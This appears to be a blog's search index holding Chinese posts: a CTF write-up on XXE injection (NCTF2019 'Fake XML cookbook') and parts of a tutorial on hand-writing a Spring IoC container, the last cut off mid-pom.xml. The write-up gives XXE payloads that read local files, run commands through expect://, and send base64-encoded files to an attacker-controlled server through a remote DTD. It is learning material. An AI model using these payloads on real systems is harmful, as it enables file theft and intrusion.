<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>浅尝XXE漏洞[NCTF2019]Fake XML cookbook</title>
    <link href="/2022/08/15/XXE%E6%BC%8F%E6%B4%9E/"/>
    <url>/2022/08/15/XXE%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<p>ps：一点骚话：最近WP写的不是很勤快了，一方面是ctf上的学习好像来到了瓶颈期，题目的难度不断上升（加上大佬的WP写的很好，自愧不如），自己经常只能停留在复现的状态，二是一方面其实我已经认识到开发与安全二者之间密切的关系，所以有在捣鼓一些别的东西，虽然前期可能对打比赛帮助微弱，但我认为这是我技术方向内功的积累。路还很长，还是得坚持，最近可能要多做总结，目前在积累一些姿势库，后续会更新。。。还是看正文吧。</p><h3 id="NCTF2019-Fake-XML-cookbook-WriteUp"><a href="#NCTF2019-Fake-XML-cookbook-WriteUp" class="headerlink" title="[NCTF2019]Fake XML cookbook WriteUp"></a>[NCTF2019]Fake XML cookbook WriteUp</h3><ul><li><p>打开题目 经典登录 盲猜sql 实则偏题 一看标题 XMLbook 网上一搜 XXE漏洞</p><p><img src="https://img-blog.csdnimg.cn/dea273ad54d9411eac319c0e42bd5fd0.png" alt="在这里插入图片描述"></p></li><li><p>XXE 全称XML External Entity Injection 即XML外部实体注入（在我看来就是注入xml类型数据搞点花罢了）</p></li><li><p>先看这题payload</p><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">note</span> [</span><span class="hljs-meta">  <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">admin</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///flag&quot;</span>&gt;</span></span><span class="hljs-meta">  ]&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><span class="hljs-symbol">&amp;admin;</span><span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>123456<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span></code></pre></div><p><img src="https://img-blog.csdnimg.cn/cba5fd6edd3e47c3a22ab281ea693956.png" alt="在这里插入图片描述"></p></li><li><p>可以看出是读取了flag文件的内容，注意这里因为将<code>file:///flag</code>命名为admin，所以下面用&amp;admin</p></li><li><p>下面就是学习了，浅学之后总结一下：</p></li></ul><h3 id="挖掘xxe肉冻"><a href="#挖掘xxe肉冻" class="headerlink" title="挖掘xxe肉冻"></a>挖掘xxe肉冻</h3><ul><li><strong>利用条件</strong>：<ul><li>libxml小于2.9.1</li><li>libxml_disable_entity_loader选项设置为false</li></ul></li><li><strong>使用</strong>：通过xxe读取目标文件内容，一般就这么用，读的就是&#x2F;etc&#x2F;password文件，执行操作系统命令不现实</li><li><strong>发现</strong>：<ul><li>抓包看accept头是否接受xml</li><li>抓包修改数据类型，把json改为xml来传数据</li></ul></li></ul><h3 id="有回显的攻击"><a href="#有回显的攻击" class="headerlink" title="有回显的攻击"></a>有回显的攻击</h3><ul><li><p>[NCTF2019]Fake XML cookbook就是一个例子。</p></li><li><p>一般性</p><div class="code-wrapper"><pre><code class="hljs xml">[ run &quot;uname&quot; command]<span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;ISO-8859-1&quot;</span>?&gt;</span><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">foo</span> [ <span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">foo</span> <span class="hljs-keyword">ANY</span> &gt;</span></span><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;expect://uname&quot;</span> &gt;</span>]&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">creds</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">creds</span>&gt;</span></code></pre></div></li><li><p>当然也可以把<code>expect://uname</code>这个部分改为外链接来绕过某些过滤，但这就没意思了嗷</p></li></ul><h3 id="无回显攻击"><a href="#无回显攻击" class="headerlink" title="无回显攻击"></a>无回显攻击</h3><ul><li><p>建立一个dtd文件，在远程服务器上面放入dtd文件，利用以后如果无报错就需要查看数据日志文件信息，可以看base64编码以后的数据。</p></li><li><p>攻击的payload</p><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">convert</span> [ </span><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">remote</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;公网IP/test.dtd&quot;</span> &gt;</span></span><span class="hljs-meta">%remote;%int;%send;</span><span class="hljs-meta">]&gt;</span></code></pre></div></li><li><p>test.dtd内容</p><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=file:///c:/windwos/win.ini&quot;</span>&gt;</span><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">int</span> <span class="hljs-string">&quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://公网IP?p=%file;&#x27;&gt;&quot;</span>&gt;</span></code></pre></div></li><li><p>无报错需要访问接受数据库的日志信息，base64解码可以得到数据</p></li></ul>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>暑假最后几天！肝爆（手写）一个Spring之Day3</title>
    <link href="/2022/08/15/spring_day03/"/>
    <url>/2022/08/15/spring_day03/</url>
    
    <content type="html"><![CDATA[<h1 id="Day03—Spring-IoC顶层结构设计"><a href="#Day03—Spring-IoC顶层结构设计" class="headerlink" title="Day03—Spring IoC顶层结构设计"></a>Day03—Spring IoC顶层结构设计</h1><p>[TOC]</p><h2 id="core-顶层接口-核心模块"><a href="#core-顶层接口-核心模块" class="headerlink" title="core(顶层接口)核心模块"></a>core(顶层接口)核心模块</h2><ul><li><p>区分BeanFactory和FactoryBean：</p><ul><li>BeanFactory：Bean工厂，是个工厂，也就是IoC容器的最高层接口，作用时管理Bean</li><li>FactoryBean：工厂Bean，是一个Bean，作用时产生其他Bean的实例</li></ul></li><li><p>创建core包，再撸</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.czh.spring.framework.core;<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">MyFactoryBean</span> &#123;&#125;</code></pre></div><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.czh.spring.framework.core;<span class="hljs-comment">/**</span><span class="hljs-comment"> * 单例工厂的顶层设计</span><span class="hljs-comment"> */</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">MyBeanFactory</span> &#123;    <span class="hljs-comment">/**</span><span class="hljs-comment">     * 根据beanName从IoC容器中获取一个实例Bean</span><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> beanName</span><span class="hljs-comment">     * <span class="hljs-doctag">@return</span></span><span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> Exception</span><span class="hljs-comment">     */</span>    Object <span class="hljs-title function_">getBean</span><span class="hljs-params">(String beanName)</span> <span class="hljs-keyword">throws</span> Exception;        <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getBean</span><span class="hljs-params">(Class&lt;?&gt; beanClass)</span> <span class="hljs-keyword">throws</span> Exception;&#125;</code></pre></div></li></ul><h2 id="beans-配置封装-模块"><a href="#beans-配置封装-模块" class="headerlink" title="beans(配置封装)模块"></a>beans(配置封装)模块</h2><ul><li><p>创建包beans.config，再撸</p></li><li><p>BeanDefinition:主要用于保存Bean相关的配置信息</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.czh.spring.framework.beans.config;<span class="hljs-keyword">import</span> lombok.Data;<span class="hljs-meta">@Data</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyBeanDefinition</span> &#123;    <span class="hljs-comment">//原生Bean的全类名</span>    <span class="hljs-keyword">private</span> String beanClassName;    <span class="hljs-comment">//标记是否延时加载，默认为false</span>    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">lazyInit</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;    <span class="hljs-comment">//保存beanName,在IoC容器中存储的key</span>    <span class="hljs-keyword">private</span> String factoryBeanName;&#125;</code></pre></div></li><li><p>BeanWrapper：主要用于封装创建后的实例对象，代理对象或者原生对象都有BeanWrapper来保存</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.czh.spring.framework.beans;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyBeanWrapper</span> &#123;    <span class="hljs-keyword">private</span> Object wrappedInstance;        <span class="hljs-keyword">public</span> <span class="hljs-title function_">MyBeanWrapper</span><span class="hljs-params">(Object wrappedInstance)</span>&#123;        <span class="hljs-built_in">this</span>.wrappedInstance = wrappedInstance;    &#125;        <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getWrappedInstance</span><span class="hljs-params">()</span>&#123;        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.wrappedInstance;    &#125;    <span class="hljs-comment">// 返回代理以后的Class</span>    <span class="hljs-comment">// 可能会是这个 $Proxy0</span>    <span class="hljs-keyword">public</span> Class&lt;?&gt; getWrappedClass()&#123;        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.wrappedInstance.getClass();    &#125;&#125;</code></pre></div></li></ul><h2 id="context-IoC容器-模块"><a href="#context-IoC容器-模块" class="headerlink" title="context(IoC容器)模块"></a>context(IoC容器)模块</h2><ul><li><p>AbstractApplicationContext：IoC容器实现类的顶层抽象类，实现IoC容器相关的公共逻辑。为了尽可能地简单化，暂时只设计一个refresh()方法。</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.czh.spring.framework.context.support;<span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyAbstractApplicationContext</span> &#123;    <span class="hljs-comment">//受保护，只提供给子类重写</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">refresh</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;&#125;&#125;</code></pre></div></li><li><p>DefaultListableBeanFactory：众多IoC容器的典型代表，暂时只设计一个顶层的IoC缓存，也就是beanDefinitionMap。</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.czh.spring.framework.beans.support;<span class="hljs-keyword">import</span> com.czh.spring.framework.beans.config.MyBeanDefinition;<span class="hljs-keyword">import</span> com.czh.spring.framework.context.support.MyAbstractApplicationContext;<span class="hljs-keyword">import</span> java.util.Map;<span class="hljs-keyword">import</span> java.util.concurrent.ConcurrentHashMap;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyDefaultListableBeanFactory</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">MyAbstractApplicationContext</span> &#123;    <span class="hljs-comment">//存储注册信息的BeanDefinition,伪IOC容器</span>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> Map&lt;String, MyBeanDefinition&gt; beanDefinitionMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConcurrentHashMap</span>&lt;String, MyBeanDefinition&gt;();&#125;</code></pre></div></li><li><p>BeanDefinitionReader：完成对application.properties配置文件的解析工作，实现看代码（请细品）</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.czh.spring.framework.beans.support;<span class="hljs-keyword">import</span> com.czh.spring.framework.beans.config.MyBeanDefinition;<span class="hljs-keyword">import</span> java.io.File;<span class="hljs-keyword">import</span> java.io.IOException;<span class="hljs-keyword">import</span> java.io.InputStream;<span class="hljs-keyword">import</span> java.net.URL;<span class="hljs-keyword">import</span> java.util.ArrayList;<span class="hljs-keyword">import</span> java.util.List;<span class="hljs-keyword">import</span> java.util.Properties;<span class="hljs-comment">/**</span><span class="hljs-comment"> * 对配置文件进行查找、读取、解析</span><span class="hljs-comment"> */</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyBeanDefinitionReader</span> &#123;        <span class="hljs-keyword">private</span> List&lt;String&gt; registerBeanClasses = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;String&gt;();    <span class="hljs-keyword">private</span> <span class="hljs-type">Properties</span> <span class="hljs-variable">config</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Properties</span>();        <span class="hljs-comment">//固定配置文件中的key，相对于XML的规范</span>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">SCAN_PACKAGE</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;scanPackage&quot;</span>;        <span class="hljs-keyword">public</span> <span class="hljs-title function_">MyBeanDefinitionReader</span><span class="hljs-params">(String...locations)</span>&#123;        <span class="hljs-comment">//通过URL定位找到其所对应的文件，然后转换为文件流</span>        <span class="hljs-type">InputStream</span> <span class="hljs-variable">is</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.getClass().getClassLoader().getResourceAsStream(locations[<span class="hljs-number">0</span>].replace(<span class="hljs-string">&quot;classpath:&quot;</span>,<span class="hljs-string">&quot;&quot;</span>));        <span class="hljs-keyword">try</span> &#123;            config.load(is);        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;            e.printStackTrace();        &#125;<span class="hljs-keyword">finally</span> &#123;            <span class="hljs-keyword">if</span>(<span class="hljs-literal">null</span> != is)&#123;                <span class="hljs-keyword">try</span> &#123;                    is.close();                &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;                    e.printStackTrace();                &#125;            &#125;        &#125;                doScanner(config.getProperty(SCAN_PACKAGE));    &#125;        <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doScanner</span><span class="hljs-params">(String scanPackage)</span>&#123;        <span class="hljs-comment">//转换为文件路径，实际上就是把.换成/</span>        <span class="hljs-comment">//利用正则巧妙处理，你说妙不妙</span>        <span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.getClass().getClassLoader().getResource(<span class="hljs-string">&quot;/&quot;</span>+scanPackage.replaceAll(<span class="hljs-string">&quot;\\.&quot;</span>,<span class="hljs-string">&quot;/&quot;</span>));        <span class="hljs-type">File</span> <span class="hljs-variable">classPath</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(url.getFile());        <span class="hljs-keyword">for</span> (File file : classPath.listFiles()) &#123;            <span class="hljs-keyword">if</span>(file.isDirectory())&#123;                <span class="hljs-comment">//如果是目录就接着递归扫描</span>                doScanner(scanPackage+<span class="hljs-string">&quot;.&quot;</span>+file.getName());            &#125;<span class="hljs-keyword">else</span> &#123;                <span class="hljs-keyword">if</span>(!file.getName().endsWith(<span class="hljs-string">&quot;.class&quot;</span>))<span class="hljs-keyword">continue</span>;<span class="hljs-comment">//如果不是class文件就跳过</span>                <span class="hljs-type">String</span> <span class="hljs-variable">className</span> <span class="hljs-operator">=</span> (scanPackage + <span class="hljs-string">&quot;.&quot;</span> +file.getName().replace(<span class="hljs-string">&quot;.class&quot;</span>,<span class="hljs-string">&quot;&quot;</span>));<span class="hljs-comment">//拼接出className</span>                registerBeanClasses.add(className);            &#125;        &#125;    &#125;        <span class="hljs-keyword">public</span> Properties <span class="hljs-title function_">getConfig</span><span class="hljs-params">()</span>&#123;        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.config;    &#125;    <span class="hljs-comment">//把配置文件中扫描到的所有配置信息转换为BeanDefinition对象，便于后面IoC操作</span>    <span class="hljs-keyword">public</span> List&lt;MyBeanDefinition&gt; <span class="hljs-title function_">loadBeanDefinitions</span><span class="hljs-params">()</span>&#123;        ArrayList&lt;MyBeanDefinition&gt; beanDefinitionList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();        <span class="hljs-keyword">try</span> &#123;            <span class="hljs-keyword">for</span> (String className : registerBeanClasses) &#123;                Class&lt;?&gt; beanClass = Class.forName(className);                <span class="hljs-keyword">if</span>(beanClass.isInterface())<span class="hljs-keyword">continue</span>;<span class="hljs-comment">//如果是接口就跳过，因为接口从类中获取</span>                                beanDefinitionList.add(doCreateBeanDefinition(toLowerFirstCase(beanClass.getSimpleName()),beanClass.getName()));                    Class&lt;?&gt;[] interfaces = beanClass.getInterfaces();                <span class="hljs-keyword">for</span> (Class&lt;?&gt; anInterface : interfaces) &#123;                    beanDefinitionList.add(doCreateBeanDefinition(anInterface.getName(),beanClass.getName()));                &#125;            &#125;        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;            e.printStackTrace();        &#125;        <span class="hljs-keyword">return</span> beanDefinitionList;    &#125;    <span class="hljs-comment">//把每一个配置信息解析成一个BeanDefinition</span>    <span class="hljs-keyword">private</span> MyBeanDefinition <span class="hljs-title function_">doCreateBeanDefinition</span><span class="hljs-params">(String factoryBeanName, String beanClassName)</span> &#123;        <span class="hljs-type">MyBeanDefinition</span> <span class="hljs-variable">beanDefinition</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyBeanDefinition</span>();        beanDefinition.setBeanClassName(beanClassName);        beanDefinition.setFactoryBeanName(factoryBeanName);        <span class="hljs-keyword">return</span> beanDefinition;    &#125;    <span class="hljs-comment">//将类名首字母改为小写</span>    <span class="hljs-keyword">private</span> String <span class="hljs-title function_">toLowerFirstCase</span><span class="hljs-params">(String simpleName)</span>&#123;        <span class="hljs-type">char</span>[] chars = simpleName.toCharArray();        chars[<span class="hljs-number">0</span>] += <span class="hljs-number">32</span>;        <span class="hljs-keyword">return</span> String.valueOf(chars);    &#125;    &#125;</code></pre></div></li><li><p>ApplicationContext：直接接触用户的入口，实现DefaultListableBeanFactory中的refresh()方法和BeanFactory的getBean()方法，完成IoC、DI、AOP的衔接</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.czh.spring.framework.context;<span class="hljs-keyword">import</span> com.czh.spring.framework.beans.MyBeanWrapper;<span class="hljs-keyword">import</span> com.czh.spring.framework.beans.config.MyBeanDefinition;<span class="hljs-keyword">import</span> com.czh.spring.framework.beans.support.MyBeanDefinitionReader;<span class="hljs-keyword">import</span> com.czh.spring.framework.beans.support.MyDefaultListableBeanFactory;<span class="hljs-keyword">import</span> com.czh.spring.framework.core.MyBeanFactory;<span class="hljs-keyword">import</span> java.util.List;<span class="hljs-keyword">import</span> java.util.Map;<span class="hljs-keyword">import</span> java.util.Properties;<span class="hljs-keyword">import</span> java.util.concurrent.ConcurrentHashMap;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyApplicationContext</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">MyDefaultListableBeanFactory</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">MyBeanFactory</span> &#123;    <span class="hljs-keyword">private</span> String[] configLocations;    <span class="hljs-keyword">private</span> MyBeanDefinitionReader reader;        <span class="hljs-comment">//单例的IoC容器缓存</span>    <span class="hljs-keyword">private</span> Map&lt;String,Object&gt; factoryBeanObjectCache = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConcurrentHashMap</span>&lt;&gt;();    <span class="hljs-comment">//通用的IoC容器</span>    <span class="hljs-keyword">private</span> Map&lt;String, MyBeanWrapper&gt; factoryBeanInstanceCache = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConcurrentHashMap</span>&lt;&gt;();        <span class="hljs-keyword">public</span> <span class="hljs-title function_">MyApplicationContext</span><span class="hljs-params">(String...configLocations)</span>&#123;        <span class="hljs-built_in">this</span>.configLocations = configLocations;        <span class="hljs-keyword">try</span> &#123;            refresh();        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;            e.printStackTrace();        &#125;    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">refresh</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;        <span class="hljs-comment">//1.定位配置文件</span>        reader = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyBeanDefinitionReader</span>(<span class="hljs-built_in">this</span>.configLocations);        <span class="hljs-comment">//2.加载配置文件，扫描相关的类，封装成BeanDefinition</span>        List&lt;MyBeanDefinition&gt; beanDefinitionList = reader.loadBeanDefinitions();        <span class="hljs-comment">//3.注册，把配置信息放到容器中(伪IoC容器)</span>        doRegisterBeanDefinition(beanDefinitionList);        <span class="hljs-comment">//4.把不是延时加载的类提前初始化</span>        doAutowired();    &#125;    <span class="hljs-comment">//只处理非延时加载的情况</span>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doAutowired</span><span class="hljs-params">()</span> &#123;        <span class="hljs-keyword">for</span> (Map.Entry&lt;String, MyBeanDefinition&gt; beanDefinitionEntry : beanDefinitionMap.entrySet()) &#123;            <span class="hljs-type">String</span> <span class="hljs-variable">beanName</span> <span class="hljs-operator">=</span> beanDefinitionEntry.getKey();            <span class="hljs-keyword">if</span>(!beanDefinitionEntry.getValue().isLazyInit())&#123;                <span class="hljs-keyword">try</span> &#123;                    getBean(beanName);                &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;                    e.printStackTrace();                &#125;            &#125;        &#125;    &#125;    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doRegisterBeanDefinition</span><span class="hljs-params">(List&lt;MyBeanDefinition&gt; beanDefinitionList)</span> <span class="hljs-keyword">throws</span> Exception &#123;        <span class="hljs-keyword">for</span> (MyBeanDefinition beanDefinition : beanDefinitionList) &#123;            <span class="hljs-keyword">if</span>(<span class="hljs-built_in">super</span>.beanDefinitionMap.containsKey(beanDefinition.getFactoryBeanName()))&#123;                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Exception</span>(<span class="hljs-string">&quot;The \&quot;&quot;</span>+beanDefinition.getFactoryBeanName()+<span class="hljs-string">&quot;\&quot; is exist!!!&quot;</span>);            &#125;            <span class="hljs-built_in">super</span>.beanDefinitionMap.put(beanDefinition.getFactoryBeanName(),beanDefinition);            <span class="hljs-comment">//到这容器初始化完毕</span>        &#125;    &#125;    <span class="hljs-comment">// TODO 依赖注入从这里开始，读取BeanDefinition中的信息，然后通过反射创建一个实例并返回，不会放原始对象进去，spring</span>    <span class="hljs-comment">// TODO 里面会用一个BeanWrapper进行一次包装</span>    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getBean</span><span class="hljs-params">(String beanName)</span> <span class="hljs-keyword">throws</span> Exception &#123;        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getBean</span><span class="hljs-params">(Class&lt;?&gt; beanClass)</span> <span class="hljs-keyword">throws</span> Exception &#123;        <span class="hljs-keyword">return</span> getBean(beanClass.getName());    &#125;        <span class="hljs-keyword">public</span> String[] getBeanDefinitionNames()&#123;        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.beanDefinitionMap.keySet().toArray(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[getBeanDefinitionCount()]);    &#125;        <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getBeanDefinitionCount</span><span class="hljs-params">()</span>&#123;        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.beanDefinitionMap.size();    &#125;        <span class="hljs-keyword">public</span> Properties <span class="hljs-title function_">getConfig</span><span class="hljs-params">()</span>&#123;        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.reader.getConfig();    &#125;    &#125;</code></pre></div></li><li><p>ApplicationContextAware：通过实现侦听机制得到一个回调方法，从而得到一个上下文，即ApplicationContext，先做设计，后面再看情况</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.czh.spring.framework.context;<span class="hljs-comment">/**</span><span class="hljs-comment"> * 通过解耦方式获得IOC容器的顶层设计</span><span class="hljs-comment"> * 后面将通过一个监听器去扫描所有的类，只要实现了此接口，</span><span class="hljs-comment"> * 将自动调用setApplicationContext()方法，从而将IOC容器注入到目标类中</span><span class="hljs-comment"> * Created by czh</span><span class="hljs-comment"> */</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">MyApplicationContextAware</span> &#123;    <span class="hljs-keyword">void</span> <span class="hljs-title function_">setApplicationContext</span><span class="hljs-params">(MyApplicationContext applicationContext)</span>;&#125;</code></pre></div></li></ul><h2 id="今日战况概览"><a href="#今日战况概览" class="headerlink" title="今日战况概览"></a>今日战况概览</h2><p><img src="https://img-blog.csdnimg.cn/0e275a07e3534a94a77e3150105288ee.png" alt="请添加图片描述"></p>]]></content>
    
    
    <categories>
      
      <category>手写spring</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>暑假最后几天！肝爆（手写）一个Spring之Day2</title>
    <link href="/2022/08/15/spring_day02/"/>
    <url>/2022/08/15/spring_day02/</url>
    
    <content type="html"><![CDATA[<h1 id="Day02—Spring开撸前之环境准备"><a href="#Day02—Spring开撸前之环境准备" class="headerlink" title="Day02—Spring开撸前之环境准备"></a>Day02—Spring开撸前之环境准备</h1><h2 id="基础配置"><a href="#基础配置" class="headerlink" title="基础配置"></a>基础配置</h2><ul><li><p>一开始肯定多少是有点懵b的，但是咱冷静一下整理思路。。。</p></li><li><p>新建一个Maven web项目，不会看教程：<a href="http://t.csdn.cn/YugX1%EF%BC%8C%E5%90%8E%E9%9D%A2%E6%80%8E%E4%B9%88%E5%90%AF%E5%8A%A8%E5%B0%B1%E6%98%AF%E6%89%93war%E5%8C%85%E5%9C%A8tomcat%E4%B8%8A%E8%BF%90%E8%A1%8C">http://t.csdn.cn/YugX1，后面怎么启动就是打war包在tomcat上运行</a></p></li><li><p>用application.properties代替application.xml（网上常见做法）</p></li><li><p><img src="https://img-blog.csdnimg.cn/7de80e859c1e4b1aa177b9a737b4dfff.png" alt="请添加图片描述"></p></li><li><p>pom.xml配置</p><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">project</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span><span class="hljs-tag">         <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><span class="hljs-tag">         <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">modelVersion</span>&gt;</span>4.0.0<span class="hljs-tag">&lt;/<span class="hljs-name">modelVersion</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.czh<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>luelueking_Spring_Source<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.0-SNAPSHOT<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">packaging</span>&gt;</span>war<span class="hljs-tag">&lt;/<span class="hljs-name">packaging</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">properties</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">maven.compiler.source</span>&gt;</span>8<span class="hljs-tag">&lt;/<span class="hljs-name">maven.compiler.source</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">maven.compiler.target</span>&gt;</span>8<span class="hljs-tag">&lt;/<span class="hljs-name">maven.compiler.target</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet.api.version</span>&gt;</span>2.4<span class="hljs-tag">&lt;/<span class="hljs-name">servlet.api.version</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">properties</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>          